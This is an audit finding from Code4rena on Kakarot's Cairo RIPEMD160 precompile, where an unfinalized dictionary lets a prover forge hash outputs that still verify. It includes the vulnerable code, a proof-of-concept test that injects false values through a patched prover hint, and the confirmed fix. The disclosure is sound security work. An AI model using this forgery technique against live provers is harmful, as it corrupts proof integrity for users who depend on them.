---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/infra
  - sector/zk
protocol: "[[Kakarot]]"
auditors:
  - "[[RadiantLabs]]"
report: "https://code4rena.com/reports/2024-09-kakarot"
genome:
  - "[[wrong-condition]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[circuit-input-range-check]]"
---
# [H-04] Non-finalized dictionary in RIPEMD160 allows forging of output

- id: 45171
- impact: HIGH
- protocol: [[Kakarot]]
- reporter: RadiantLabs (Code4rena)
- source: https://code4rena.com/reports/2024-09-kakarot

## Summary


The bug report discusses a vulnerability in the `ripemd160` function of the Kakarot program. When the `ripemd160.finish()` function does not enter a specific condition, the dictionary `x` is not finalized and is instead reassigned to a new dictionary. This can lead to incorrect values being inserted for read operations on the old dictionary, resulting in a forged output that can be proven to be correct. The recommended mitigation is to call `default_dict_finalize()` before reassigning the dictionary. The severity of this bug is considered high and has been confirmed and mitigated by the Kakarot team.

## Details


When [`ripemd160.finish()`](https://github.com/kkrt-labs/kakarot/blob/7411a5520e8a00be6f5243a50c160e66ad285563/src/kakarot/precompiles/ripemd160.cairo#L427) does not enter the `if (next_block == FALSE)` condition at L456, the dictionary `x` initialized at the beginning of the function is not finalized. Instead, `x` is reassigned to reference a new dictionary at L470:

```cairo
File: ripemd160.cairo
456:     if (next_block == FALSE) {
			 ...
462:         default_dict_finalize(start, x, 0);
463:         let (res, rsize) = compress(buf, bufsize, arr_x, 16);
464:         return (res=res, rsize=rsize);
465:     }
466:     let (local arr_x: felt*) = alloc();
467:     dict_to_array{dict_ptr=x}(arr_x, 16);
468:     let (buf, bufsize) = compress(buf, bufsize, arr_x, 16);
469:     // reset dict to all 0.
470:     let (x) = default_dict_new(0);
```

Because the old dictionary is never finalized, it is possible to insert incorrect values for read operations on the old dictionary, which allows proving an incorrect output for any input of `size > 55` (56 with the fix to our separate vulnerability on this value).

Read operations on the old dictionary are performed in [`ripemd160::absorb_data`](https://github.com/kkrt-labs/kakarot/blob/7411a5520e8a00be6f5243a50c160e66ad285563/src/kakarot/precompiles/ripemd160.cairo#L148):

```cairo
File: ripemd160.cairo
148: func absorb_data{range_check_ptr, bitwise_ptr: BitwiseBuiltin*, dict_ptr: DictAccess*}(
149:     data: felt*, len: felt, index: felt
150: ) {
151:     alloc_locals;
152:     if (index - len == 0) {
153:         return ();
154:     }
155: 
156:     let (index_4, _) = unsigned_div_rem(index, 4);
157:     let (index_and_3) = uint32_and(index, 3);
158:     let (factor) = uint32_mul(8, index_and_3);
159:     let (factor) = pow2(factor);
160:     let (tmp) = uint32_mul([data], factor);
161:     let (old_val) = dict_read{dict_ptr=dict_ptr}(index_4);
162:     let (val) = uint32_xor(old_val, tmp);
163:     dict_write{dict_ptr=dict_ptr}(index_4, val);
164: 
165:     absorb_data{dict_ptr=dict_ptr}(data + 1, len, index + 1);
166:     return ();
167: }
```

### Proof of Concept

The below test case can be added to `test_ripemd160.py` to demonstrate the vulnerability:

```python
async def test_ripemd160_output_can_be_forged(self, cairo_program, cairo_run):
	msg_bytes = bytes([0x00] * 57)
	with (
		patch_hint(
			cairo_program,
			"vm_enter_scope()",
			"try:\n"
			"    dict_tracker = __dict_manager.get_tracker(ids.dict_ptr)\n"
			"    dict_tracker.data[ids.index_4] = 1\n"
			"except Exception: pass\n"
			"vm_enter_scope()"
		)
	):
		precompile_hash = cairo_run("test__ripemd160", msg=list(msg_bytes))

		# Hash with RIPEMD-160 to compare with precompile result
		ripemd160_crypto = RIPEMD160.new()
		ripemd160_crypto.update(msg_bytes)
		expected_hash = ripemd160_crypto.hexdigest()

		assert expected_hash.rjust(64, "0") != bytes(precompile_hash).hex()
```

The test requires adding the following "noop" hints below [`ripemd160.cairo#L160`](https://github.com/kkrt-labs/kakarot/blob/7411a5520e8a00be6f5243a50c160e66ad285563/src/kakarot/precompiles/ripemd160.cairo#L160) so we can insert the malicious hint:

```python
    %{ vm_enter_scope() %}
    %{ vm_exit_scope() %}
```

The patched hint modifies the in-memory dictionary of the prover, which results in the `dict_read` operation in the following line returning an incorrect fixed value. Because a `dict_read` call is really an append operation, and the new values aren't checked against the previous ones if the dictionary is not squashed, this results in a forged output that can be proven to be correct.

### Recommended Mitigation Steps

Call `default_dict_finalize(start, x, 0);` before `let (x) = default_dict_new(0);`.

**[ClementWalter (Kakarot) confirmed and commented](https://github.com/code-423n4/2024-09-kakarot-findings/issues/54#issuecomment-2451963424):**
 > Severity: High

**Kakarot mitigated:**
> [PR](https://github.com/kkrt-labs/kakarot/pull/1577) fix: finalize dictionary in `RIPEMD160`. Finalizes the `dict` and reassign to start after resetting the `dict`.

**Status:** Mitigation confirmed.

***
